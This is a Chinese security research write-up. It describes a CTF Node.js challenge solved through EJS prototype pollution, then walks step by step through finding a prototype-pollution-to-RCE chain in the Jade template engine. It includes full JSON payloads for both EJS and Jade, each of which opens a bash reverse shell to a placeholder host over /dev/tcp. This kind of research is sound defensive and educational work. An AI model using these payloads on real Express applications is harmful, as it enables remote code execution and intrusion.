@@ -1,0 +1,178 @@
+## 引子
+2019年12月09日，知识星球《代码审计》处理一道 nodejs 题目。（虽然我 11 号才在某群看到）
+结果呢，非预期 RCE 了。（QAQ 我不是故意的）
+### EJS RCE
+题目，只有一个登录页面，不管发啥都是user err，也没得 cookie
+及其他信息。怎么看都是原型链污染。`{"__proto__":{"xxx":{}}}`
+首先，通过包含特殊关键词看报错信息，比如一些特殊变量或者对象内方法。
+  * body
+  * req
+  * app
+  * data
+  * toString
+  * valueOf
+    RangeError: Maximum call stack size exceeded
+      at merge (/root/prototype_pullotion/routes/index.js:32:15)
+      ...
+直觉判断是 ejs 做的模板，反手急速一个 ejs 的 rce 利用
+    {"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxx/6666 0>&1\"');var __tmp2"}}
+反弹，getflag！
+## JADE RCE 利用链挖掘
+正题来了。
+日穿上题之后我就想，ejs 有 rce，那么其他模板引擎有没有呢？
+常见 Express 模板引擎有(包括但不限于如下)：
+  * jade
+  * pug
+  * ejs
+  * dust.js
+  * nunjunks
+于是就开始了 Jade 审计，动调之路。
+### 环境搭建
+  * [app.js](https://gist.github.com/virink/6238ea127b32e2f396658c53aa2aaf46)
+  * views/index.jade
+    yarn add express jade
+    # node app.js
+Debug by VSCode
+    {
+        "version": "0.2.0",
+        "configurations": [{
+            "type": "node",
+            "request": "launch",
+            "name": "Launch Program",
+            "skipFiles": [
+                "/**"
+            ],
+            "program": "${file}"
+        }]
+    }
+### 调用栈梳理
+根据模板渲染通用调用栈： `parse -> compile ->
+render`梳理实际调用栈。可以直接静态分析（看就完事），也可以动态调试（还是看就完事）。最终梳理出一下调用栈：
+  1. app.js :: res.render
+  2. jade/lib/index.js :: exports.__express
+  3. jade/lib/index.js :: exports.renderFile
+    1. jade/lib/index.js :: handleTemplateCache
+  4. jade/lib/index.js :: exports.compile
+    1. jade/lib/index.js :: parse -> compiler.compile();
+      1. jade/lib/compiler.js :: Compiler.compile -> this.visit(this.node)
+      2. jade/lib/compiler.js :: this.visit
+      3. jade/lib/compiler.js :: this.buf.push
+    2. jade/lib/index.js :: parse -> options.self
+    3. jade/lib/index.js :: fn = new Function('locals, jade', fn)
+    4. jade/lib/index.js :: fn(locals, Object.create(runtime))
+### 思路
+**原型链污染** 利用的关键就是找到可以覆盖的属性或者方法。
+~~总感觉这种注入方式跟 SSTI(服务器模板注入) 有区别，但是我又说不清楚什么。~~
+这类漏洞的关键主要是在 compile编译 截断，通过原型链污染覆盖某些属性，在编译过程中注入模板，在渲染的时候就会执行我们注入的恶意代码。
+限制：
+  * 保证能够执行到渲染阶段，因为覆盖某些属性会导致莫名其妙的异常
+  * 被覆盖的属性无硬编码默认值
+#### Step 1 Jade 入口 exports.__express
+    exports.__express = function (path, options, fn) {
+      if (options.compileDebug == undefined && process.env.NODE_ENV === 'production') {
+        options.compileDebug = false;
+      }
+      exports.renderFile(path, options, fn);
+    }
+**options.compileDebug** 无初始值，可以覆盖开启 Debug 模式
+    {"__proto__":{"compileDebug":1}}
+但是覆盖后却报错
+    TypeError: plugin is not a function
+        at Parser.loadPlugins (./node_modules/acorn/dist/acorn.js:1629:7)
+        at new Parser (./node_modules/acorn/dist/acorn.js:1561:10)
+        at Object.parse (./node_modules/acorn/dist/acorn.js:905:10)
+        at reallyParse (./node_modules/acorn-globals/index.js:30:18)
+        at findGlobals (./node_modules/acorn-globals/index.js:45:11)
+        at addWith (./node_modules/with/index.js:44:28)
+        at parse (./node_modules/jade/lib/index.js:149:9)
+        at Object.exports.compile (./node_modules/jade/lib/index.js:205:16)
+        at handleTemplateCache (./node_modules/jade/lib/index.js:174:25)
+        at Object.exports.renderFile (./node_modules/jade/lib/index.js:381:10)
+通过分析报错调用栈可知其异常发生在编译过程，因此我们继续往下看。
+#### Step 2 编译过程 exports.compile
+    exports.compile = function (str, options) {
+      var options = options || {}
+        , filename = options.filename
+          ? utils.stringify(options.filename)
+          : 'undefined'
+        , fn;
+      str = String(str);
+      var parsed = parse(str, options);
+#### Step 3 编译解析 exports.compile -> parse
+    // ...
+    try {
+        // Parse
+        tokens = parser.parse();
+    } catch (err) {
+    // ...
+    // Compile
+    try {
+        js = compiler.compile();
+    }
+    // ...
+    var body = ''
+        + 'var buf = [];\n'
+        + 'var jade_mixins = {};\n'
+        + 'var jade_interp;\n'
+        + (options.self
+          ? 'var self = locals || {};\n' + js
+          : addWith('locals || {}', '\n' + js, globals)) + ';'
+        + 'return buf.join("");';
+    return { body: body, dependencies: parser.dependencies };
+解析 -> 编译 -> 返回编译后代码。
+此处我们可以发现报错入口 **addWith** ，只要不进入这个条件分支就可以避免报错了（具体异常原因请自行分析），也就是覆盖 self 为 true!
+    {"__proto__":{"compileDebug":1,"self":1}}
+#### Step 4 编译解析 exports.compile -> parse -> compile
+凭感觉， **parse** 可看可不看，本文主要分析编译过程，所以跳过 **parse**.
+    compile: function(){
+      this.buf = [];
+      if (this.pp) this.buf.push("var jade_indent = [];");
+      this.lastBufferedIdx = -1;
+      this.visit(this.node);
+      //...
+      return this.buf.join('\n');
+    }
+编译后代码存放在 **this.buf** 中，通过 **this.visit(this.node);** 遍历分析 **parse** 产生的 AST 树
+**this.node**
+主要寻找有哪些可控、可覆盖的变量被添加到 **this.buf** 中。可以下断动调分析，同时还可以全局搜索`this.buf.push(`！
+    visit: function(node){
+      var debug = this.debug;
+      if (debug) {
+        this.buf.push('jade_debug.unshift(new jade.DebugItem( ' + node.line
+          + ', ' + (node.filename
+            ? utils.stringify(node.filename)
+            : 'jade_debug[0].filename')
+          + ' ));');
+      }
+      // ...
+      this.visitNode(node);
+      if (debug) this.buf.push('jade_debug.shift();');
+    }
+继续看代码可见 **node.line** 和 **node.filename** 在 debug 为真的时候进入了 buf。然而
+**node.filename** 被 **utils.stringify** 处理过了，无法逃逸双引号。唯有考虑 line 是否可以被覆盖了。
+另外 **this.debug** 哪里来？？
+    var Compiler = module.exports = function Compiler(node, options) {
+      this.debug = false !== options.compileDebug;
+      // ...
+    };
+初始化 **Compiler** 的时候判断了 **options.compileDebug** ，over！
+#### Step 5 注入测试
+    visit: function (node) {
+      var debug = this.debug;
+      // 注入测试
+      if (node.line == undefined) {
+        console.log(node)
+      }
+一点一点的动调跟踪比较麻烦，直接写个判断
+可见当 node 为 Block 的时候 line 是不存在的。
+    node.line == undefined
+    node.__proto__.line == undefined
+理论上覆盖了 line 就可以达到注入的目的！
+    {"__proto__":{"compileDebug":1,"self":1,"line":"console.log('test inject')"}}
+#### Step 6 RCE
+    {"__proto__":{"compileDebug":1,"self":1,"line":"console.log(global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/xxx/6666 0>&1\"'))"}}
+## Ending
+以上不算是漏洞，毕竟原型链污染是造出来的。所以本文算是存在原型链污染的前提对 Jade 的利用链挖掘。
+当然我也在同时简单看了下 Pug 模板引擎，可惜，没挖出来。。。有兴趣的师傅可以去看看。
+## Referer
+> [XNUCA2019 Hardjs题解 从原型链污染到RCE](https://xz.aliyun.com/t/6113)
